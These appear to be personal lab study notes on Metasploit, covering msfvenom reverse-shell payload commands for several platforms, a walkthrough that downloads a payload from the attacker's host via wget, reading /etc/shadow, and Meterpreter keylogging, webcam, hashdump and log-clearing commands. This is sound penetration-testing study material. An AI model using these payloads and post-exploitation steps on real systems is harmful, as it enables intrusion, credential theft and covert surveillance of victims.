[[metasploit]]

Docs: https://docs.metasploit.com/

CVE wiki: https://cve.mitre.org/index.html [[CVE]]

Rankings: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking

options:

    CONCURRENCY: Number of targets to be scanned simultaneously.
    PORTS: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
    RHOSTS: Target or target network to be scanned.
    THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.



## Recomended tools:

### scanners: 
	- scanner/discovery/udp_sweep
	- auxiliary/scanner/smb/smb_ms17_010
	- scanner/smb/smb_version

### Database 
[[msfdb]]
- start database: `systemctl start postgresql`
- initialize db: `msfdb init`
- check status> `db_status`
- list workspaces: `workspace`
	- switch workspace: `workspace [name]`
	- add workspace: `-a` `[name]`
	- delete workspace `-d` `[name]`
	- delete all workspaces: `-D`
	- options `-h`
	- rename: `-r`
	
## nmap 
- `db_nmap` (will save to db)
	- can then reach `hosts` and `sevices` 
- `hosts -h`
- `hosts -R` to add to RHOSTS
- `services -h`
- `services -S` to search for services. ex: `services -S netbios` 

## msfvenom 
[[msfvenom]]
Create and use custom payloads that can later be used in msfconsole

- msfvenom -h (help)
- msfvenom -l payloads
- msfvenom --list formats

#### create payloads (LHOST  must be attackbox)
- msfvenom -p php/meterpreter/reverse_tcp LHOST={ip_address} -f raw -e php/base64
- msfvenom -p php/reverse_php LHOST={ip_address} LPORT=7777 -f raw > reverse_shell.php

The file: reverse_shell.php wil be stored in home/kali/reverse_shell.php.
**remember to edit file so that <?php and ?> is present**

####  Multi Handler 
[[multi handler]] [[reverse shell]] 
 - go into msfconsole and use `use exploit/multi/handler` 
 - use exploit/multi/handler

Linux Executable and Linkable Format (elf)
``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf``
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.

Windows
``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe``

PHP
``msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php``

ASP
``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp``

Python
``msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py``

All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.


#### progression
- ssh into the target machine and ``sudo su`` to get root shell
- Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice). 
   ``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf``
- Transfer it to the target machine (you can start a Python web server on your attacking machine with the  ``python3 -m http.server`` 9000  command and use wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf to download it to the target machine).
-  now the target machine has the shell.elf file on its system
- start a meterpreter session with msfconsole
- chmod 777 rev_shell.elf to make the file downloaded on the target machine executable
- go back in msfconsole, use exploit(multi/handler), then set the payload to the msfvenom payload you created: `linux/x86/meterpreter/reverse_tcp`
- set lhost and port to the same as payload 
- exploit
- the exploit is now listening on the target maching
- return to target machine and run the executable shell you downloaded: `rev_shell.elf` by typing ./rev_shell.elf
- go back to msfconsole and you should now have a meterpreter session running and be inside the target machine
- if the target is a linux machine you can't use `hashdump`, instead you must cd into etc/ find the shadow file and `cat shadow`. This should show the hashes

# meterpreter
[[meterpreter]]
https://www.offsec.com/metasploit-unleashed/meterpreter-basics/

- to get process ID: `getpid`
- if using `ps` command, the meterpreter will list as: spoolsv.exe and not Meterpreter.exe
- to find DLLs (Dynamic-Link Libraries) we can use tasklist /m /fi "pid eq 1304" if the PID is 1304

Meterpreter will provide you with three primary categories of tools;

    Built-in commands
    Meterpreter tools
    Meterpreter scripting

If you run the help command, you will see Meterpreter commands are listed under different categories.

    Core commands
    File system commands
    Networking commands
    System commands
    User interface commands
    Webcam commands
    Audio output commands
    Elevate commands
    Password database commands
    Timestomp commands

Please note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.

 

Meterpreter commands

Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.

Core commands

    background: Backgrounds the current session
    exit: Terminate the Meterpreter session
    guid: Get the session GUID (Globally Unique Identifier)
    help: Displays the help menu
    info: Displays information about a Post module
    irb: Opens an interactive Ruby shell on the current session
    load: Loads one or more Meterpreter extensions
    migrate: Allows you to migrate Meterpreter to another process
    run: Executes a Meterpreter script or Post module
    sessions: Quickly switch to another session

File system commands

    cd: Will change directory
    ls: Will list files in the current directory (dir will also work)
    pwd: Prints the current working directory
    edit: will allow you to edit a file
    cat: Will show the contents of a file to the screen
    rm: Will delete the specified file
    search: Will search for files
    upload: Will upload a file or directory
    download: Will download a file or directory

Networking commands

    arp: Displays the host ARP (Address Resolution Protocol) cache
    ifconfig: Displays network interfaces available on the target system
    netstat: Displays the network connections
    portfwd: Forwards a local port to a remote service
    route: Allows you to view and modify the routing table

System commands

    clearev: Clears the event logs
    execute: Executes a command
    getpid: Shows the current process identifier
    getuid: Shows the user that Meterpreter is running as
    kill: Terminates a process
    pkill: Terminates processes by name
    ps: Lists running processes
    reboot: Reboots the remote computer
    shell: Drops into a system command shell
    shutdown: Shuts down the remote computer
    sysinfo: Gets information about the remote system, such as OS

Others Commands (these will be listed under different menu categories in the help menu)

    idletime: Returns the number of seconds the remote user has been idle
    keyscan_dump: Dumps the keystroke buffer
    keyscan_start: Starts capturing keystrokes
    keyscan_stop: Stops capturing keystrokes
    screenshare: Allows you to watch the remote user's desktop in real time
    screenshot: Grabs a screenshot of the interactive desktop
    record_mic: Records audio from the default microphone for X seconds
    webcam_chat: Starts a video chat
    webcam_list: Lists webcams
    webcam_snap: Takes a snapshot from the specified webcam
    webcam_stream: Plays a video stream from the specified webcam
    getsystem: Attempts to elevate your privilege to that of local system
    hashdump: Dumps the contents of the SAM database


#### migrate meterpreter
Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the keyscan_start, keyscan_stop, and keyscan_dump command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.

To migrate to any process, you need to type the migrate command followed by the PID of the desired target process. The example below shows Meterpreter migrating to process ID 716. 

- migrate 716

Be careful; you may lose your user privileges if you migrate from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You may not be able to gain them back.

Commands mentioned previously, such as getsystem and hashdump will provide important leverage and information for privilege escalation and lateral movement. 
Finally, you can also use the ``load`` command to leverage additional tools such as Kiwi or even the whole Python language.
- meterpreter > ``load python``




get current use: ``getuid``
get system privelege: `getsystem`


